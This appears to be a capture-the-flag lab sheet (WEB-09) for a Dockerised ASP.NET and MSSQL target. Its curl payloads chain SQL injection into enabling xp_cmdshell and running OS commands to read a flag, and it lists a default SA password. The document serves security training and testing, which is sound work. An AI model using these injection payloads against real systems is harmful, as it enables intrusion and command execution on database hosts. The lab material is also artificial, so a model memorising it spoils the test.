# WEB-09: MSSQL xp_cmdshell Command Execution

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-09 |
| 名称 | MSSQL xp_cmdshell Command Execution |
| 技术/CVE | MSSQL xp_cmdshell |
| 难度 | L2 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10109 |

## 场景概述
- 技术：MSSQL xp_cmdshell
- 难度：L2
- 交付方式：docker
- 入口端口：10109
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| Technique | MSSQL xp_cmdshell |
| Difficulty | L2 |
| Web Port | 10109 |
| DB Port | 10119 |
| DB | MSSQL Server 2022 |
| SA Password | Password123! |

### Attack Path
```
SQLi in ASP.NET app → Enable xp_cmdshell → Execute OS commands → /flag.txt
```

### Step-by-Step

```bash
# Step 1: SQL injection in ASP.NET application
curl "http://localhost:10109/search?q=test'+OR+1=1--"

# Step 2: Enable xp_cmdshell via SQLi
curl "http://localhost:10109/search?q=';EXEC+sp_configure+'show+advanced+options',1;RECONFIGURE;--"
curl "http://localhost:10109/search?q=';EXEC+sp_configure+'xp_cmdshell',1;RECONFIGURE;--"

# Step 3: Execute command to read flag
curl "http://localhost:10109/search?q=';EXEC+xp_cmdshell+'cat+/flag.txt';--"
# flag{web-09-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | MSSQL service, sqlcmd/TDS interaction |
| 侦察与前置条件 | xp_cmdshell enablement and SQL Server privilege discovery |
| 核心漏洞与利用 | Execute OS commands with xp_cmdshell |
| 权限、横向或影响 | SQL Server host command execution |
| 验证 | Use type/cat through xp_cmdshell to capture the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
